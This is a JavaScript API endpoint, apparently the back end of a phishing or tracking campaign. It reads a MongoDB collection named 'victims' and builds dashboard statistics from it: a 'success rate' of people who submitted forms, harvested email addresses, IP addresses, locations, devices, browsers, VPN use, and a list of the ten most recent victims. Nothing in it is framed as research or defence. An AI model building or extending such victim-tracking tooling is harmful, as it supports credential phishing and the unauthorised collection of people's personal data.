/**
 * Statistics API Endpoint
 *
 * Provides aggregated statistics for dashboard
 *
 * GET /api/stats
 */

import { getVictimsCollection } from './_mongodb.js';

/**
 * Calculate statistics from victims data
 * @param {Array} victims
 * @returns {Object}
 */
function calculateStats(victims) {
  const stats = {
    totalVictims: victims.length,
    successRate: 0,
    averageTime: 0,
    uniqueLocations: 0,
    deviceBreakdown: {
      mobile: 0,
      desktop: 0,
      tablet: 0,
    },
    topCountries: [],
    topCities: [],
    topBrowsers: [],
    topOS: [],
    hourlyData: [],
    vpnUsers: 0,
    recentVictims: [],
  };

  if (victims.length === 0) {
    return stats;
  }

  // Calculate success rate (users who submitted forms)
  const submitted = victims.filter((v) => v.metadata?.userSubmitted).length;
  stats.successRate = ((submitted / victims.length) * 100).toFixed(1);

  // Calculate average time on page
  const times = victims
    .filter((v) => v.behavior?.timeOnPage)
    .map((v) => v.behavior.timeOnPage);
  if (times.length > 0) {
    stats.averageTime = Math.round(times.reduce((a, b) => a + b, 0) / times.length);
  }

  // Count unique locations
  const locations = new Set(
    victims
      .filter((v) => v.network?.city && v.network?.country)
      .map((v) => `${v.network.city},${v.network.country}`)
  );
  stats.uniqueLocations = locations.size;

  // Device breakdown
  victims.forEach((v) => {
    if (v.device?.isMobile) stats.deviceBreakdown.mobile++;
    else if (v.device?.isTablet) stats.deviceBreakdown.tablet++;
    else stats.deviceBreakdown.desktop++;
  });

  // Top countries
  const countryCounts = {};
  victims.forEach((v) => {
    const country = v.network?.country_name || 'Unknown';
    countryCounts[country] = (countryCounts[country] || 0) + 1;
  });
  stats.topCountries = Object.entries(countryCounts)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 10)
    .map(([name, count]) => ({ name, count }));

  // Top cities
  const cityCounts = {};
  victims.forEach((v) => {
    const city = v.network?.city || 'Unknown';
    cityCounts[city] = (cityCounts[city] || 0) + 1;
  });
  stats.topCities = Object.entries(cityCounts)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 10)
    .map(([name, count]) => ({ name, count }));

  // Top browsers
  const browserCounts = {};
  victims.forEach((v) => {
    const browser = v.browser?.name || 'Unknown';
    browserCounts[browser] = (browserCounts[browser] || 0) + 1;
  });
  stats.topBrowsers = Object.entries(browserCounts)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5)
    .map(([name, count]) => ({ name, count }));

  // Top OS
  const osCounts = {};
  victims.forEach((v) => {
    const os = v.os?.name || 'Unknown';
    osCounts[os] = (osCounts[os] || 0) + 1;
  });
  stats.topOS = Object.entries(osCounts)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5)
    .map(([name, count]) => ({ name, count }));

  // Hourly data (last 24 hours)
  const now = new Date();
  const hourlyMap = {};

  for (let i = 23; i >= 0; i--) {
    const hourDate = new Date(now - i * 60 * 60 * 1000);
    const hourKey = hourDate.toISOString().slice(0, 13); // YYYY-MM-DDTHH
    hourlyMap[hourKey] = 0;
  }

  victims.forEach((v) => {
    if (v.timestamp) {
      const hourKey = new Date(v.timestamp).toISOString().slice(0, 13);
      if (hourlyMap.hasOwnProperty(hourKey)) {
        hourlyMap[hourKey]++;
      }
    }
  });

  stats.hourlyData = Object.entries(hourlyMap).map(([hour, count]) => ({
    hour: new Date(hour).toLocaleString('en-US', { hour: 'numeric', hour12: true }),
    count,
  }));

  // VPN users
  stats.vpnUsers = victims.filter((v) => v.network?.vpnDetection?.likelyVPN).length;

  // Recent victims (last 10)
  stats.recentVictims = victims
    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
    .slice(0, 10)
    .map((v) => ({
      timestamp: v.timestamp,
      email: v.metadata?.formData?.email || 'N/A',
      ip: v.network?.ip || 'Unknown',
      city: v.network?.city || 'Unknown',
      country: v.network?.country_name || 'Unknown',
      device: v.device?.type || 'Unknown',
      browser: v.browser?.name || 'Unknown',
    }));

  return stats;
}

/**
 * Main handler
 */
export default async function handler(req, res) {
  // Only allow GET
  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const collection = await getVictimsCollection();

    // Fetch all victims (for stats calculation)
    // In production, consider using MongoDB aggregation pipelines for better performance
    const victims = await collection.find({}).toArray();

    // Calculate stats
    const stats = calculateStats(victims);

    // Return stats
    return res.status(200).json(stats);
  } catch (error) {
    console.error('Stats error:', error);
    return res.status(500).json({
      error: 'Internal server error',
      message: error.message,
    });
  }
}
